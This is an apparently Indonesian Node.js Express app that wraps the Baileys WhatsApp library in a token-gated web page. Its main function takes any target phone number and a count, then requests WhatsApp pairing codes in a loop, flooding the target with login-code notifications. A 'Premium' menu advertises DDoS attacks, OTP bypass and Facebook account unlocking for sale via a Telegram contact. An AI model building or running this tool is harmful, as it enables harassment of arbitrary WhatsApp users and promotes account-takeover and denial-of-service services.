const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require("pino");
const express = require("express");

const app = express();
const PORT = process.env.PORT || 3000;
const VALID_TOKEN = "@404"; // Token yang valid

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// === Halaman Login Token ===
app.get("/", (req, res) => {
    res.send(`
        <html>
        <head>
            <title>Login</title>
            <style>
                body { text-align: center; font-family: Arial, sans-serif; background: #222; color: white; padding-top: 50px; }
                input, button { padding: 10px; margin: 10px; font-size: 16px; width: 90%; max-width: 300px; }
            </style>
        </head>
        <body>
            <h2>Masukkan Token</h2>
            <form action="/validate-token" method="POST">
                <input type="text" name="token" placeholder="Masukkan Token" required />
                <button type="submit">Masuk</button>
            </form>
        </body>
        </html>
    `);
});

// === Validasi Token ===
app.post("/validate-token", (req, res) => {
    const { token } = req.body;
    if (token === VALID_TOKEN) {
        return res.redirect("/home");
    } else {
        return res.send("<h2 style='color: red;'>Token Salah!</h2><a href='/'>Coba Lagi</a>");
    }
});

// === Halaman Home + Pairing + Premium Fake ===
app.get("/home", (req, res) => {
    res.send(`
        <html>
        <head>
            <title>Menu Utama</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background-color: #111; color: white; text-align: center; font-family: Arial, sans-serif; margin: 0; }
                nav { background: black; padding: 15px; text-align: center; display: flex; justify-content: space-around; }
                nav a { color: white; text-decoration: none; font-size: 18px; padding: 10px; }
                .container { padding: 20px; }
                input, button { padding: 12px; margin: 10px; font-size: 16px; width: 90%; max-width: 350px; border-radius: 5px; border: none; }
                .hidden { display: none; }
                button { background: #00ccff; color: black; font-weight: bold; cursor: pointer; }
                button:hover { background: #0099cc; }
            </style>
        </head>
        <body>
            <nav>
                <a href="#" onclick="showPage('home')"> Home</a>
                <a href="#" onclick="showPage('pairing')"> Pairing</a>
                <a href="#" onclick="showPage('premium')"> Premium</a>
            </nav>
            <div class="container">
                <div id="home">
                    <h2>buy prem? t.me/YanOfc</h2>
                    <p>Pilih menu di atas.</p>
                </div>
                <div id="pairing" class="hidden">
                    <h2>Pairing WhatsApp</h2>
                    <input type="text" id="nomor" placeholder="Masukkan Nomor WA" />
                    <input type="number" id="jumlah" placeholder="Jumlah Pairing" />
                    <button onclick="startPairing()">Mulai Pairing</button>
                    <div id="pairing-result"></div>
                </div>
                <div id="premium" class="hidden">
                    <h2>🔥 Layanan Premium</h2>
                    <button onclick="alert('Premium Only!')">🚀 DDOS Attack</button>
                    <button onclick="alert('Premium Only!')">📲 OTP Bypass</button>
                    <button onclick="alert('Premium Only!')">🔓 Unlock Facebook</button>
                    <p style="color: red;">*Semua fitur ini hanya untuk user Premium.</p>
                </div>
            </div>
            <script>
                function showPage(page) {
                    document.getElementById("home").classList.add("hidden");
                    document.getElementById("pairing").classList.add("hidden");
                    document.getElementById("premium").classList.add("hidden");
                    document.getElementById(page).classList.remove("hidden");
                }
                function startPairing() {
                    const nomor = document.getElementById("nomor").value;
                    const jumlah = document.getElementById("jumlah").value;
                    if (!nomor || !jumlah) return alert("Nomor dan jumlah harus diisi!");
                    fetch(\`/pairing?nomor=\${nomor}&jumlah=\${jumlah}\`)
                        .then(res => res.json())
                        .then(data => {
                            let resultHTML = "<h3>Pairing Codes:</h3>";
                            data.codes.forEach(code => {
                                resultHTML += "<p>" + code + "</p>";
                            });
                            document.getElementById("pairing-result").innerHTML = resultHTML;
                        })
                        .catch(err => alert("Error saat pairing: " + err.message));
                }
            </script>
        </body>
        </html>
    `);
});

// === API Pairing ===
async function XeonProject(nomorTarget, xeonCodes) {
    try {
        const { state } = await useMultiFileAuthState("./69/session");
        const XeonBotInc = makeWASocket({
            logger: pino({ level: "info" }),
            printQRInTerminal: true,
            auth: state,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
        });

        console.log("Requesting pairing codes...");
        await new Promise(resolve => setTimeout(resolve, 2000));

        let codes = [];
        for (let i = 0; i < xeonCodes; i++) {
            try {
                let code = await XeonBotInc.requestPairingCode(nomorTarget);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                codes.push(code);
                console.log(`${nomorTarget} [${i + 1}/${xeonCodes}] Pairing Code: ${code}`);
            } catch (error) {
                console.error("Error saat mendapatkan pairing code:", error.message);
            }
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        return codes;
    } catch (error) {
        console.error("Kesalahan saat menginisialisasi bot:", error.message);
        return [];
    }
}

app.get("/pairing", async (req, res) => {
    try {
        const { nomor, jumlah } = req.query;
        if (!nomor || !jumlah) {
            return res.status(400).json({ error: "Nomor dan jumlah diperlukan!" });
        }
        const codes = await XeonProject(nomor, parseInt(jumlah));
        res.json({ nomor, codes });
    } catch (error) {
        console.error("Error di endpoint pairing:", error.message);
        res.status(500).json({ error: "Terjadi kesalahan dalam pairing." });
    }
});

// Global handler untuk error
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

app.listen(process.env.PORT || 3000, () => {
  console.log(`Server berjalan di port ${process.env.PORT || 3000}`);
});
